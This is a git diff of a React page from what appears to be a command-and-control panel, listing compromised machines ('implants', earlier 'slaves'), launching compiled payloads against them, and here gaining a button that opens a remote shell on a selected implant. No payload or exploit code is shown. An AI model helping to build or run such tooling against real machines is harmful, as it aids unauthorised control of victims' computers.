@@ -6,7 +6,6 @@ import UserService from "../services/UserService";
 const SlavesPage = () => {
 
     const userService = new UserService();
-    const navigate = useNavigate();
     const [slaves, setSlaves] = useState([]);
     const [loading, setLoading] = useState(true);
     const [modalShow, setModalShow] = useState(false);
@@ -53,7 +52,7 @@ const SlavesPage = () => {
         setPayloadErrorText("");
         if (selectedPayload.variables && payloadVars) {
 
-            // Check if payloadvars are set.
+            // Check if payloadvars are set. 
             if (payloadVars.filter((v => v.value != null)).length != 
                 selectedPayload.variables.length) {
                 setPayloadErrorText("No variables set correctly!");
@@ -69,7 +68,7 @@ const SlavesPage = () => {
         userService.launchPayload(payload).then((res) => {
 
             setModalShow(false);
-            window.location.replace("/jobs");
+            window.location.reload()
 
         }).catch((err) => {
 
@@ -83,10 +82,14 @@ const SlavesPage = () => {
                 setCompileError(err.response.data.compileError);
             }
 
-            console.error("Failed to launch slave!");
+            console.error("Failed to launch payload!");
             setPayloadErrorText("Failed to launch payload! Message: " + err.response.data.message);
         })
         
+    }
+
+    const launchShell = () => {
+        window.location.replace("/shell/" + selectedSlave)
     }
     
 
@@ -106,7 +109,7 @@ const SlavesPage = () => {
                 }
 
                 console.error(err);
-                console.error("Failed to retrieve slaves!");
+                console.error("Failed to retrieve implants!");
             })
 
             userService.getPayloads().then((res) => {
@@ -120,7 +123,7 @@ const SlavesPage = () => {
                 }
 
                 console.error(err);
-                console.error("Failed to retrieve slaves!");
+                console.error("Failed to retrieve implants!");
             })
 
         }, 1000);
@@ -131,6 +134,7 @@ const SlavesPage = () => {
         const slave = slaves[index];
         setInfoSlave({
             index: index,
+            id: slave.id,
             computername: slave.computername,
             os: slave.os,
             nickname: slave.nickname,
@@ -156,9 +160,13 @@ const SlavesPage = () => {
                 <Modal.Title>Implant details</Modal.Title>
             </Modal.Header>
             <Modal.Body>
-                <h4>Slave:</h4>
+                <h4>Implant:</h4>
                 <Table size="sm">
                 <tbody>
+                    <tr>
+                        <th>ID</th>
+                        <td>{infoSlave.id}</td>
+                    </tr>
                     <tr>
                         <th>Computername</th>
                         <td>{infoSlave.computername}</td>
@@ -221,11 +229,12 @@ const SlavesPage = () => {
                 {payloadErrorText ? <p style={{color: "red"}}>{payloadErrorText}</p> : <></>}
                 <br/>
                 { compileError.length > 0 ? <pre>{compileError}</pre> : <></>}
-                <Button variant="outline-danger" onClick={() => launchPayload()}>Launch</Button>
+                <Button variant="outline-danger" onClick={() => launchPayload()}>Launch</Button>  
+                <Button variant="outline-dark" style={{marginLeft: "10px"}} onClick={() => launchShell()}>Shell</Button>
             </Modal.Body>
         </Modal>
 
-        <h1>All implants (Slaves)</h1>
+        <h1>All implants</h1>
         <Table striped bordered hover>
             <thead>
                 <th>Nickname</th>
